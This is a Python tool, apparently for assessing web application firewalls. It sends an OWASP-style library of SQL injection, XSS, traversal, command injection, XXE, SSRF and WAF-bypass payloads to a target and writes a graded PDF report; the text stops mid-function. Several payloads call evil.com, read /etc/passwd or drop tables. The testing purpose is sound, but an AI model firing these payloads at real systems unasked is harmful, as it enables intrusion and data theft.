#!/usr/bin/env python3
"""
WAF Quality Tester - OWASP-based payload testing tool
Author: Security Testing Tool
Purpose: Authorized penetration testing only

DISCLAIMER: Only use on systems you own or have explicit written permission to test.
Unauthorized use may violate computer fraud and abuse laws.
"""

import requests
import urllib3
import time
import json
import re
import sys
import argparse
from datetime import datetime
from urllib.parse import urlparse
import warnings

warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─────────────────────────────────────────────
# OWASP PAYLOAD LIBRARY
# ─────────────────────────────────────────────

PAYLOADS = {
    "SQL Injection - Classic": [
        ("SQLi-01", "' OR '1'='1", "Basic OR injection"),
        ("SQLi-02", "' OR 1=1--", "Comment-based bypass"),
        ("SQLi-03", "1' ORDER BY 1--+", "ORDER BY detection"),
        ("SQLi-04", "1 UNION SELECT NULL,NULL--", "UNION-based injection"),
        ("SQLi-05", "' AND SLEEP(5)--", "Time-based blind SQLi"),
        ("SQLi-06", "'; DROP TABLE users--", "Destructive payload"),
        ("SQLi-07", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "Nested time-based"),
        ("SQLi-08", "' OR 'x'='x", "String comparison bypass"),
        ("SQLi-09", "admin'--", "Authentication bypass"),
        ("SQLi-10", "1; EXEC xp_cmdshell('dir')--", "MSSQL command execution"),
    ],
    "SQL Injection - Bypass WAF": [
        ("SQLi-BP-01", "' /*!OR*/ '1'='1", "MySQL inline comment bypass"),
        ("SQLi-BP-02", "'%09OR%091=1--", "Tab character bypass"),
        ("SQLi-BP-03", "' OR 0x31=0x31--", "Hex encoding bypass"),
        ("SQLi-BP-04", "'+OR+1=1--", "URL-encoded space bypass"),
        ("SQLi-BP-05", "' oR '1'='1", "Mixed case bypass"),
        ("SQLi-BP-06", "'\u0009OR\u00091=1--", "Unicode whitespace bypass"),
        ("SQLi-BP-07", "%27%20OR%201%3D1--", "Full URL encoding"),
        ("SQLi-BP-08", "' OR/**/'1'='1", "Inline comment space"),
        ("SQLi-BP-09", "1;%00SELECT%001--", "Null byte injection"),
        ("SQLi-BP-10", "' OR CHAR(49)=CHAR(49)--", "CHAR function bypass"),
    ],
    "XSS - Reflected": [
        ("XSS-01", "<script>alert(1)</script>", "Basic script tag"),
        ("XSS-02", "<img src=x onerror=alert(1)>", "IMG onerror event"),
        ("XSS-03", "<svg onload=alert(1)>", "SVG onload event"),
        ("XSS-04", "javascript:alert(1)", "JavaScript protocol"),
        ("XSS-05", "<body onload=alert(1)>", "Body onload event"),
        ("XSS-06", "'\"><script>alert(1)</script>", "Attribute breakout"),
        ("XSS-07", "<iframe src=javascript:alert(1)>", "Iframe javascript src"),
        ("XSS-08", "<input onfocus=alert(1) autofocus>", "Input autofocus"),
        ("XSS-09", "<details open ontoggle=alert(1)>", "Details ontoggle"),
        ("XSS-10", "<math><mtext></table><img src=x onerror=alert(1)>", "MathML injection"),
    ],
    "XSS - Bypass WAF": [
        ("XSS-BP-01", "<ScRiPt>alert(1)</ScRiPt>", "Mixed case bypass"),
        ("XSS-BP-02", "<script>al\x00ert(1)</script>", "Null byte in keyword"),
        ("XSS-BP-03", "<img src=x onerror=\"&#97;lert(1)\">", "HTML entity encoding"),
        ("XSS-BP-04", "<svg/onload=alert(1)>", "No-space tag bypass"),
        ("XSS-BP-05", "<<script>alert(1)//<</script>", "Double bracket bypass"),
        ("XSS-BP-06", "<script>eval(atob('YWxlcnQoMSk='))</script>", "Base64 bypass"),
        ("XSS-BP-07", "%3Cscript%3Ealert(1)%3C/script%3E", "URL encoded"),
        ("XSS-BP-08", "<img src=1 href=1 onerror=\"javascript:alert(1)\">", "Multi-attr bypass"),
        ("XSS-BP-09", "<object data=javascript:alert(1)>", "Object data bypass"),
        ("XSS-BP-10", "<script>setTimeout('ale'+'rt(1)',0)</script>", "String concat bypass"),
    ],
    "Path Traversal / LFI": [
        ("LFI-01", "../../../etc/passwd", "Basic traversal"),
        ("LFI-02", "....//....//....//etc/passwd", "Double dot bypass"),
        ("LFI-03", "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL encoded traversal"),
        ("LFI-04", "..%252f..%252fetc%252fpasswd", "Double URL encoded"),
        ("LFI-05", "/etc/passwd%00", "Null byte termination"),
        ("LFI-06", "....\/....\/etc/passwd", "Backslash mix"),
        ("LFI-07", "php://filter/convert.base64-encode/resource=/etc/passwd", "PHP filter"),
        ("LFI-08", "file:///etc/passwd", "File protocol"),
        ("LFI-09", "/proc/self/environ", "Proc environ access"),
        ("LFI-10", "C:\\Windows\\System32\\drivers\\etc\\hosts", "Windows path traversal"),
    ],
    "Command Injection": [
        ("CMDi-01", "; ls -la", "Semicolon injection"),
        ("CMDi-02", "| whoami", "Pipe injection"),
        ("CMDi-03", "`id`", "Backtick injection"),
        ("CMDi-04", "$(cat /etc/passwd)", "Subshell injection"),
        ("CMDi-05", "&& cat /etc/passwd", "AND-chain injection"),
        ("CMDi-06", "; ping -c 4 127.0.0.1", "Ping test injection"),
        ("CMDi-07", "\n/bin/ls\n", "Newline injection"),
        ("CMDi-08", ";%0aid", "Encoded newline injection"),
        ("CMDi-09", "| net user", "Windows net user"),
        ("CMDi-10", "`sleep 5`", "Time-based backtick"),
    ],
    "Command Injection - Bypass": [
        ("CMDi-BP-01", ";l's'-la", "Quote insertion bypass"),
        ("CMDi-BP-02", ";w'h'o'a'm'i", "Fragmented command bypass"),
        ("CMDi-BP-03", ";${IFS}ls", "IFS variable bypass"),
        ("CMDi-BP-04", ";l${a}s", "Empty var bypass"),
        ("CMDi-BP-05", ";&& id", "Space-less AND bypass"),
    ],
    "XXE Injection": [
        ("XXE-01", "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>", "Classic XXE"),
        ("XXE-02", "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><foo>&xxe;</foo>", "SSRF via XXE"),
        ("XXE-03", "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'>%xxe;]>", "Parameter entity XXE"),
    ],
    "SSRF": [
        ("SSRF-01", "http://127.0.0.1/admin", "Localhost SSRF"),
        ("SSRF-02", "http://169.254.169.254/latest/meta-data/", "AWS metadata SSRF"),
        ("SSRF-03", "http://[::1]/admin", "IPv6 loopback SSRF"),
        ("SSRF-04", "http://0.0.0.0/", "Null IP SSRF"),
        ("SSRF-05", "http://localhost:8080/admin", "Alt port SSRF"),
        ("SSRF-06", "http://2130706433/", "Decimal IP SSRF (127.0.0.1)"),
        ("SSRF-07", "dict://127.0.0.1:11211/", "Dict protocol SSRF"),
        ("SSRF-08", "gopher://127.0.0.1:25/", "Gopher protocol SSRF"),
    ],
    "HTTP Header Injection": [
        ("HDR-01", "X-Forwarded-For: 127.0.0.1", "IP spoofing header"),
        ("HDR-02", "X-Original-URL: /admin", "URL override header"),
        ("HDR-03", "X-Rewrite-URL: /admin", "URL rewrite header"),
        ("HDR-04", "X-Custom-IP-Authorization: 127.0.0.1", "Custom IP auth header"),
        ("HDR-05", "Referer: javascript:alert(1)", "Referer XSS"),
    ],
    "SSTI (Template Injection)": [
        ("SSTI-01", "{{7*7}}", "Jinja2/Twig detection"),
        ("SSTI-02", "${7*7}", "FreeMarker/Velocity detection"),
        ("SSTI-03", "{{7*'7'}}", "Jinja2 string multiplication"),
        ("SSTI-04", "<%= 7*7 %>", "ERB/EJS detection"),
        ("SSTI-05", "#{7*7}", "Ruby ERB detection"),
        ("SSTI-06", "{{config}}", "Jinja2 config dump"),
        ("SSTI-07", "{{''.__class__.__mro__[2].__subclasses__()}}", "Jinja2 class traversal"),
    ],
    "NoSQL Injection": [
        ("NoSQL-01", "{'$gt': ''}", "MongoDB greater-than operator"),
        ("NoSQL-02", "{'$where': 'sleep(5000)'}", "MongoDB JS injection"),
        ("NoSQL-03", "username[$ne]=&password[$ne]=", "Not-equal operator bypass"),
        ("NoSQL-04", "[$regex]=.*", "Regex injection"),
        ("NoSQL-05", "{'$or': [{'password': {'$exists': False}}, {'password': ''}]}", "Existence bypass"),
    ],
    "CRLF / Header Injection": [
        ("CRLF-01", "%0d%0aSet-Cookie: malicious=value", "CRLF cookie injection"),
        ("CRLF-02", "%0d%0aContent-Type: text/html", "CRLF content-type"),
        ("CRLF-03", "%0aLocation: http://evil.com", "LF redirect injection"),
        ("CRLF-04", "value%0d%0aX-XSS-Protection: 0", "Disable XSS protection"),
    ],
    "Open Redirect": [
        ("REDIR-01", "//evil.com", "Protocol-relative redirect"),
        ("REDIR-02", "https://evil.com", "Absolute URL redirect"),
        ("REDIR-03", "//evil.com/%2f..", "Slash confusion redirect"),
        ("REDIR-04", "https:///evil.com", "Triple-slash redirect"),
        ("REDIR-05", "/%09/evil.com", "Tab-based redirect"),
    ],
}

# ─────────────────────────────────────────────
# WAF DETECTION SIGNATURES
# ─────────────────────────────────────────────

WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status"],
        "body": ["cloudflare", "cf-mitigated"],
        "status": [403, 503],
    },
    "AWS WAF / Shield": {
        "headers": ["x-amzn-requestid", "x-amzn-trace-id", "x-amz-cf-id"],
        "body": ["aws waf", "403 forbidden"],
        "status": [403, 400],
    },
    "Akamai": {
        "headers": ["akamai-grn", "x-check-cacheable", "x-akamai-transformed"],
        "body": ["akamai", "reference #"],
        "status": [403],
    },
    "Imperva / Incapsula": {
        "headers": ["x-iinfo", "x-cdn"],
        "body": ["incapsula", "imperva", "_incap_ses"],
        "status": [403],
    },
    "F5 BIG-IP ASM": {
        "headers": ["x-cnection"],
        "body": ["the requested url was rejected", "f5", "your support id"],
        "status": [403],
    },
    "Nginx / ModSecurity": {
        "headers": ["server"],
        "body": ["mod_security", "modsecurity", "406 not acceptable"],
        "status": [403, 406],
    },
    "Fortinet FortiWeb": {
        "headers": ["fortiwafsid"],
        "body": ["fortiweb", "fortigate"],
        "status": [403],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body": ["sucuri", "cloudproxy"],
        "status": [403],
    },
    "Barracuda": {
        "headers": ["barra_counter_session"],
        "body": ["barracuda", "you cannot access this page"],
        "status": [403],
    },
    "OWASP CRS": {
        "headers": [],
        "body": ["not acceptable", "406", "access denied"],
        "status": [403, 406, 400],
    },
}

# ─────────────────────────────────────────────
# WAF TESTER CLASS
# ─────────────────────────────────────────────

class WAFTester:
    def __init__(self, target_url, timeout=10, delay=0.5, verbose=False):
        self.target_url = target_url.rstrip("/")
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        })
        self.results = {
            "target": target_url,
            "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "waf_detected": False,
            "waf_type": "Unknown",
            "baseline_status": None,
            "categories": {},
            "summary": {},
        }
        self.baseline_response = None

    def log(self, msg, level="INFO"):
        colors = {"INFO": "\033[94m", "OK": "\033[92m", "WARN": "\033[93m",
                  "FAIL": "\033[91m", "RESET": "\033[0m", "BOLD": "\033[1m"}
        prefix = {"INFO": "[*]", "OK": "[+]", "WARN": "[!]", "FAIL": "[-]"}
        if self.verbose or level in ("OK", "FAIL", "WARN"):
            print(f"{colors.get(level,'')}{prefix.get(level,'[?]')} {msg}{colors['RESET']}")

    def get_baseline(self):
        """Send a benign request to establish baseline."""
        try:
            r = self.session.get(self.target_url, timeout=self.timeout)
            self.baseline_response = r
            self.results["baseline_status"] = r.status_code
            self.log(f"Baseline: HTTP {r.status_code} | Size: {len(r.content)} bytes", "OK")
            return True
        except requests.exceptions.ConnectionError:
            self.log(f"Cannot connect to {self.target_url}", "FAIL")
            return False
        except Exception as e:
            self.log(f"Baseline error: {e}", "FAIL")
            return False

    def detect_waf(self):
        """Detect WAF type from headers and response body."""
        self.log("Running WAF detection...", "INFO")
        if not self.baseline_response:
            return

        headers = {k.lower(): v.lower() for k, v in self.baseline_response.headers.items()}
        body = self.baseline_response.text.lower()

        detected = []
        for waf_name, sigs in WAF_SIGNATURES.items():
            score = 0
            for hdr in sigs["headers"]:
                if hdr.lower() in headers:
                    score += 2
            for keyword in sigs["body"]:
                if keyword.lower() in body:
                    score += 1
            if score >= 2:
                detected.append((waf_name, score))

        # Also check server header
        server_header = headers.get("server", "")
        if server_header:
            self.log(f"Server header: {server_header}", "INFO")

        # Send a probe payload to trigger WAF
        probe = "' OR 1=1--"
        try:
            pr = self.session.get(
                self.target_url,
                params={"q": probe, "id": probe, "search": probe},
                timeout=self.timeout
            )
            probe_headers = {k.lower(): v.lower() for k, v in pr.headers.items()}
            probe_body = pr.text.lower()

            for waf_name, sigs in WAF_SIGNATURES.items():
                score_extra = 0
                for hdr in sigs["headers"]:
                    if hdr.lower() in probe_headers:
                        score_extra += 2
                for keyword in sigs["body"]:
                    if keyword.lower() in probe_body:
                        score_extra += 3
                if pr.status_code in sigs["status"] and score_extra > 0:
                    score_extra += 2
                if score_extra >= 2:
                    # Merge with detected
                    found = False
                    for i, (n, s) in enumerate(detected):
                        if n == waf_name:
                            detected[i] = (n, s + score_extra)
                            found = True
                    if not found:
                        detected.append((waf_name, score_extra))

        except Exception:
            pass

        if detected:
            detected.sort(key=lambda x: x[1], reverse=True)
            self.results["waf_detected"] = True
            self.results["waf_type"] = detected[0][0]
            self.results["waf_candidates"] = [d[0] for d in detected]
            self.log(f"WAF Detected: {detected[0][0]}", "WARN")
        else:
            self.results["waf_detected"] = False
            self.results["waf_type"] = "None detected"
            self.log("No WAF detected or WAF is well-hidden", "WARN")

    def test_payload(self, payload_str):
        """Send a single payload and analyze response."""
        BLOCKED_INDICATORS = [
            lambda r: r.status_code in [400, 403, 406, 429, 503],
            lambda r: any(kw in r.text.lower() for kw in [
                "blocked", "forbidden", "access denied", "illegal",
                "not acceptable", "waf", "security", "rejected",
                "your request has been blocked", "incapsula",
                "cloudflare", "malicious", "attack detected"
            ]),
        ]
        BYPASS_INDICATORS = [
            lambda r: r.status_code in [200, 201, 301, 302],
            lambda r: r.status_code == self.results.get("baseline_status", 200),
        ]

        try:
            r = self.session.get(
                self.target_url,
                params={"q": payload_str, "id": payload_str, "input": payload_str, "search": payload_str},
                timeout=self.timeout,
                allow_redirects=False,
            )
            is_blocked = any(fn(r) for fn in BLOCKED_INDICATORS)
            is_bypass = any(fn(r) for fn in BYPASS_INDICATORS) and not is_blocked

            return {
                "status_code": r.status_code,
                "blocked": is_blocked,
                "bypassed": is_bypass,
                "response_size": len(r.content),
                "response_time": r.elapsed.total_seconds(),
            }
        except requests.exceptions.Timeout:
            return {"status_code": 0, "blocked": False, "bypassed": False,
                    "response_size": 0, "response_time": self.timeout, "error": "timeout"}
        except Exception as e:
            return {"status_code": 0, "blocked": False, "bypassed": False,
                    "response_size": 0, "response_time": 0, "error": str(e)[:100]}

    def run_tests(self):
        """Run all payload categories."""
        total_payloads = sum(len(v) for v in PAYLOADS.values())
        done = 0

        print(f"\n\033[1m[>>>] Starting payload tests: {total_payloads} total payloads across {len(PAYLOADS)} categories\033[0m\n")

        for category, payloads in PAYLOADS.items():
            cat_results = []
            blocked_count = 0
            bypass_count = 0
            error_count = 0

            print(f"\033[94m[*] Category: {category} ({len(payloads)} payloads)\033[0m")

            for pid, payload_str, description in payloads:
                result = self.test_payload(payload_str)
                result["id"] = pid
                result["payload"] = payload_str
                result["description"] = description

                if result.get("error"):
                    error_count += 1
                    status_icon = "⚠"
                    color = "\033[93m"
                elif result["blocked"]:
                    blocked_count += 1
                    status_icon = "✗ BLOCKED"
                    color = "\033[92m"
                else:
                    bypass_count += 1
                    status_icon = "✓ BYPASSED"
                    color = "\033[91m"

                print(f"  {color}[{pid}] {status_icon}\033[0m | HTTP {result['status_code']} | {description[:50]}")
                cat_results.append(result)
                done += 1
                time.sleep(self.delay)

            total_cat = len(payloads)
            block_rate = (blocked_count / total_cat * 100) if total_cat > 0 else 0
            bypass_rate = (bypass_count / total_cat * 100) if total_cat > 0 else 0

            self.results["categories"][category] = {
                "payloads": cat_results,
                "total": total_cat,
                "blocked": blocked_count,
                "bypassed": bypass_count,
                "errors": error_count,
                "block_rate": round(block_rate, 1),
                "bypass_rate": round(bypass_rate, 1),
            }

            print(f"  → Blocked: {blocked_count}/{total_cat} ({block_rate:.0f}%) | Bypassed: {bypass_count}/{total_cat} ({bypass_rate:.0f}%)\n")

        # Summary
        all_blocked = sum(c["blocked"] for c in self.results["categories"].values())
        all_bypassed = sum(c["bypassed"] for c in self.results["categories"].values())
        all_total = sum(c["total"] for c in self.results["categories"].values())
        overall_block_rate = (all_blocked / all_total * 100) if all_total > 0 else 0

        self.results["summary"] = {
            "total_payloads": all_total,
            "total_blocked": all_blocked,
            "total_bypassed": all_bypassed,
            "overall_block_rate": round(overall_block_rate, 1),
            "overall_bypass_rate": round(100 - overall_block_rate, 1),
            "grade": self._calc_grade(overall_block_rate),
        }

        print(f"\033[1m[SUMMARY] Block Rate: {overall_block_rate:.1f}% | Grade: {self.results['summary']['grade']}\033[0m")

    def _calc_grade(self, block_rate):
        if block_rate >= 95: return "A+ (Excellent)"
        if block_rate >= 85: return "A (Very Good)"
        if block_rate >= 75: return "B (Good)"
        if block_rate >= 60: return "C (Fair)"
        if block_rate >= 40: return "D (Weak)"
        return "F (Critical Risk)"

    def get_recommendations(self):
        """Generate category-specific recommendations."""
        recs = []
        cats = self.results["categories"]

        mapping = {
            "SQL Injection - Classic": (
                "Enable signature-based SQLi detection rules (OWASP CRS rules 942xxx).",
                "Implement parameterized queries at the application layer."
            ),
            "SQL Injection - Bypass WAF": (
                "Enable anomaly-based detection with threshold scoring.",
                "Use semantic analysis instead of pure regex matching."
            ),
            "XSS - Reflected": (
                "Enable OWASP CRS XSS rules (941xxx) with strict mode.",
                "Add Content-Security-Policy (CSP) headers."
            ),
            "XSS - Bypass WAF": (
                "Enable HTML entity decoding before rule matching.",
                "Use output encoding at the application layer."
            ),
            "Path Traversal / LFI": (
                "Enable path normalization and traversal rules (930xxx).",
                "Restrict file system access via application sandbox."
            ),
            "Command Injection": (
                "Enable OS command injection rules (932xxx).",
                "Whitelist allowed input characters at the application layer."
            ),
            "Command Injection - Bypass": (
                "Enable shell metacharacter detection with decoding passes.",
                "Apply multi-layer input validation."
            ),
            "XXE Injection": (
                "Disable XML external entity processing in XML parsers.",
                "Enable XXE detection rules and content-type validation."
            ),
            "SSRF": (
                "Enable SSRF detection rules and block internal IP ranges.",
                "Implement strict allowlisting for outbound requests."
            ),
            "HTTP Header Injection": (
                "Validate and sanitize all HTTP request headers.",
                "Block internal IP headers (X-Forwarded-For spoofing)."
            ),
            "SSTI (Template Injection)": (
                "Enable SSTI detection rules for common template engines.",
                "Sandbox template rendering environments."
            ),
            "NoSQL Injection": (
                "Enable NoSQL injection detection rules.",
                "Use parameterized queries / ODM input validation."
            ),
            "CRLF / Header Injection": (
                "Enable CRLF detection and URL-decode input before matching.",
                "Strip or encode CR/LF characters in all inputs."
            ),
            "Open Redirect": (
                "Validate redirect URLs against an allowlist.",
                "Enable open redirect detection rules."
            ),
        }

        for category, data in cats.items():
            if data["bypass_rate"] > 20:
                r1, r2 = mapping.get(category, ("Review WAF rules for this category.", "Apply defense-in-depth."))
                recs.append({
                    "category": category,
                    "severity": "HIGH" if data["bypass_rate"] > 50 else "MEDIUM",
                    "bypass_rate": data["bypass_rate"],
                    "waf_rec": r1,
                    "app_rec": r2,
                })

        recs.sort(key=lambda x: x["bypass_rate"], reverse=True)
        self.results["recommendations"] = recs
        return recs


# ─────────────────────────────────────────────
# PDF REPORT GENERATOR
# ─────────────────────────────────────────────

def generate_pdf_report(results, output_path):
    from reportlab.lib.pagesizes import A4
    from reportlab.lib import colors
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import cm
    from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer, Table,
                                    TableStyle, HRFlowable, PageBreak)
    from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_RIGHT

    doc = SimpleDocTemplate(output_path, pagesize=A4,
                            leftMargin=2*cm, rightMargin=2*cm,
                            topMargin=2*cm, bottomMargin=2*cm)

    styles = getSampleStyleSheet()
    RED = colors.HexColor("#C0392B")
    GREEN = colors.HexColor("#27AE60")
    ORANGE = colors.HexColor("#E67E22")
    BLUE = colors.HexColor("#2C3E50")
    LIGHTGRAY = colors.HexColor("#ECF0F1")
    MIDGRAY = colors.HexColor("#BDC3C7")

    title_style = ParagraphStyle("title", parent=styles["Title"], fontSize=22,
                                  textColor=BLUE, spaceAfter=6, alignment=TA_CENTER)
    h1_style = ParagraphStyle("h1", parent=styles["Heading1"], fontSize=14,
                               textColor=BLUE, spaceBefore=14, spaceAfter=6)
    h2_style = ParagraphStyle("h2", parent=styles["Heading2"], fontSize=11,
                               textColor=colors.HexColor("#34495E"), spaceBefore=10, spaceAfter=4)
    body_style = ParagraphStyle("body", parent=styles["Normal"], fontSize=9,
                                 leading=13, spaceAfter=4)
    center_style = ParagraphStyle("center", parent=styles["Normal"],
                                   fontSize=9, alignment=TA_CENTER)
    small_style = ParagraphStyle("small", parent=styles["Normal"],
                                  fontSize=8, textColor=colors.grey)

    summary = results["summary"]
    recs = results.get("recommendations", [])
    block_rate = summary["overall_block_rate"]
    grade = summary["grade"]
    grade_color = GREEN if block_rate >= 85 else (ORANGE if block_rate >= 60 else RED)

    story = []

    # ── Cover ──
    story.append(Spacer(1, 1.5*cm))
    story.append(Paragraph("WAF QUALITY ASSESSMENT REPORT", title_style))
    story.append(Spacer(1, 0.3*cm))
    story.append(HRFlowable(width="100%", thickness=2, color=BLUE))
    story.append(Spacer(1, 0.5*cm))

    cover_data = [
        ["Target URL", results["target"]],
        ["Scan Date", results["scan_time"]],
        ["WAF Detected", results["waf_type"]],
        ["Total Payloads", str(summary["total_payloads"])],
        ["Payloads Blocked", f"{summary['total_blocked']} ({summary['overall_block_rate']}%)"],
        ["Payloads Bypassed", f"{summary['total_bypassed']} ({summary['overall_bypass_rate']}%)"],
        ["Overall Grade", grade],
    ]
    cover_table = Table(cover_data, colWidths=[5*cm, 12*cm])
    cover_table.setStyle(TableStyle([
        ("FONTNAME", (0, 0), (0, -1), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 9),
        ("TEXTCOLOR", (0, 0), (0, -1), BLUE),
        ("TEXTCOLOR", (1, 6), (1, 6), grade_color),
        ("FONTNAME", (1, 6), (1, 6), "Helvetica-Bold"),
        ("FONTSIZE", (1, 6), (1, 6), 11),
        ("ROWBACKGROUNDS", (0, 0), (-1, -1), [LIGHTGRAY, colors.white]),
        ("GRID", (0, 0), (-1, -1), 0.5, MIDGRAY),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("LEFTPADDING", (0, 0), (-1, -1), 8),
    ]))
    story.append(cover_table)

    # Disclaimer
    story.append(Spacer(1, 0.8*cm))
    story.append(Paragraph(
        "<i>DISCLAIMER: This report is generated for authorized security testing purposes only. "
        "Use of this tool against systems without explicit written permission is illegal and unethical.</i>",
        ParagraphStyle("disc", parent=styles["Normal"], fontSize=7.5,
                       textColor=colors.grey, borderColor=MIDGRAY,
                       borderWidth=0.5, borderPadding=6)
    ))
    story.append(PageBreak())

    # ── Category Summary Table ──
    story.append(Paragraph("1. Category Summary", h1_style))
    story.append(HRFlowable(width="100%", thickness=1, color=MIDGRAY))
    story.append(Spacer(1, 0.3*cm))

    cat_header = ["Category", "Total", "Blocked", "Bypassed", "Block Rate", "Risk Level"]
    cat_data = [cat_header]
    for cat, data in results["categories"].items():
        br = data["block_rate"]
        risk = "LOW" if br >= 85 else ("MEDIUM" if br >= 60 else "HIGH")
        cat_data.append([
            Paragraph(cat[:40], body_style),
            str(data["total"]),
            str(data["blocked"]),
            str(data["bypassed"]),
            f"{br}%",
            risk,
        ])

    cat_table = Table(cat_data, colWidths=[5.5*cm, 1.5*cm, 1.8*cm, 2*cm, 2.2*cm, 2.2*cm])
    cat_style = TableStyle([
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 8),
        ("BACKGROUND", (0, 0), (-1, 0), BLUE),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, LIGHTGRAY]),
        ("GRID", (0, 0), (-1, -1), 0.4, MIDGRAY),
        ("ALIGN", (1, 0), (-1, -1), "CENTER"),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("TOPPADDING", (0, 0), (-1, -1), 5),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
    ])
    # Color-code risk
    for i, (cat, data) in enumerate(results["categories"].items(), start=1):
        br = data["block_rate"]
        if br >= 85:
            cat_style.add("TEXTCOLOR", (5, i), (5, i), GREEN)
        elif br >= 60:
            cat_style.add("TEXTCOLOR", (5, i), (5, i), ORANGE)
        else:
            cat_style.add("TEXTCOLOR", (5, i), (5, i), RED)
        cat_style.add("FONTNAME", (5, i), (5, i), "Helvetica-Bold")

    cat_table.setStyle(cat_style)
    story.append(cat_table)
    story.append(PageBreak())

    # ── Detailed Payload Results ──
    story.append(Paragraph("2. Detailed Payload Results", h1_style))
    story.append(HRFlowable(width="100%", thickness=1, color=MIDGRAY))

    for cat, data in results["categories"].items():
        story.append(Spacer(1, 0.4*cm))
        story.append(Paragraph(f"2.{list(results['categories'].keys()).index(cat)+1} {cat}", h2_style))

        stats_text = (f"Blocked: <b>{data['blocked']}/{data['total']}</b>  |  "
                      f"Bypassed: <b>{data['bypassed']}/{data['total']}</b>  |  "
                      f"Block Rate: <b>{data['block_rate']}%</b>")
        story.append(Paragraph(stats_text, body_style))
        story.append(Spacer(1, 0.15*cm))

        payload_header = ["ID", "Description", "HTTP", "Result"]
        payload_data = [payload_header]
        for p in data["payloads"]:
            result_text = "BLOCKED" if p["blocked"] else ("BYPASSED" if p["bypassed"] else "ERROR")
            payload_data.append([
                p["id"],
                Paragraph(p["description"][:60], small_style),
                str(p["status_code"]),
                result_text,
            ])

        pt = Table(payload_data, colWidths=[2*cm, 9*cm, 1.8*cm, 2.4*cm])
        ps = TableStyle([
            ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
            ("FONTSIZE", (0, 0), (-1, -1), 7.5),
            ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#34495E")),
            ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
            ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, LIGHTGRAY]),
            ("GRID", (0, 0), (-1, -1), 0.3, MIDGRAY),
            ("ALIGN", (0, 0), (-1, -1), "CENTER"),
            ("ALIGN", (1, 0), (1, -1), "LEFT"),
            ("TOPPADDING", (0, 0), (-1, -1), 4),
            ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
            ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ])
        for i, p in enumerate(data["payloads"], start=1):
            if p["blocked"]:
                ps.add("TEXTCOLOR", (3, i), (3, i), GREEN)
                ps.add("FONTNAME", (3, i), (3, i), "Helvetica-Bold")
            elif p["bypassed"]:
                ps.add("TEXTCOLOR", (3, i), (3, i), RED)
                ps.add("FONTNAME", (3, i), (3, i), "Helvetica-Bold")
            else:
                ps.add("TEXTCOLOR", (3, i), (3, i), ORANGE)
        pt.setStyle(ps)
        story.append(pt)

    story.append(PageBreak())

    # ── Strengths & Weaknesses ──
    story.append(Paragraph("3. Strengths & Weaknesses Analysis", h1_style))
    story.append(HRFlowable(width="100%", thickness=1, color=MIDGRAY))
    story.append(Spacer(1, 0.3*cm))

    strengths = [(cat, d) for cat, d in results["categories"].items() if d["block_rate"] >= 85]
    weaknesses = [(cat, d) for cat, d in results["categories"].items() if d["block_rate"] < 60]
    fair = [(cat, d) for cat, d in results["categories"].items() if 60 <= d["block_rate"] < 85]

    story.append(Paragraph("Strengths (Block Rate >= 85%)", h2_style))
    if strengths:
        for cat, d in strengths:
            story.append(Paragraph(f"✓  <b>{cat}</b> — Block rate: {d['block_rate']}%", body_style))
    else:
        story.append(Paragraph("No categories achieved 85%+ block rate.", body_style))

    story.append(Spacer(1, 0.3*cm))
    story.append(Paragraph("Areas Needing Improvement (60–84%)", h2_style))
    if fair:
        for cat, d in fair:
            story.append(Paragraph(f"~  <b>{cat}</b> — Block rate: {d['block_rate']}%", body_style))
    else:
        story.append(Paragraph("None in this range.", body_style))

    story.append(Spacer(1, 0.3*cm))
    story.append(Paragraph("Critical Weaknesses (Block Rate < 60%)", h2_style))
    if weaknesses:
        for cat, d in weaknesses:
            story.append(Paragraph(
                f"✗  <b>{cat}</b> — Block rate: {d['block_rate']}% ({d['bypassed']} payloads bypassed)",
                ParagraphStyle("weak", parent=body_style, textColor=RED)
            ))
    else:
        story.append(Paragraph("No critical weaknesses found.", body_style))

    story.append(PageBreak())

    # ── Recommendations ──
    story.append(Paragraph("4. Recommendations", h1_style))
    story.append(HRFlowable(width="100%", thickness=1, color=MIDGRAY))
    story.append(Spacer(1, 0.3*cm))

    if recs:
        for i, rec in enumerate(recs, 1):
            sev_color = RED if rec["severity"] == "HIGH" else ORANGE
            story.append(Paragraph(
                f"{i}. [{rec['severity']}] <b>{rec['category']}</b> — Bypass Rate: {rec['bypass_rate']}%",
